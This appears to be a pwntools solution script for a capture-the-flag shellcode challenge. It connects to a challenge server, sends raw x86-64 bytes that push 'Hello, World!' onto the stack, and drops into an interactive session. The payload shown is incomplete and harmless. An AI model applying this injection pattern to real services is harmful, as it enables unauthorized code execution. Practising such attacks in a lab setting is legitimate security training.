from pwn import *

io = connect("shellone.challs.havce.it", 1338)
header = io.recvline()
print(header)
io.sendline(b"\x48\xB8\x6F\x72\x6C\x64\x21\x00\x00\x00\x50\x48\xB8\x48\x65\x6C\x6C\x6F\x2C\x20\x57\x50")
io.interactive()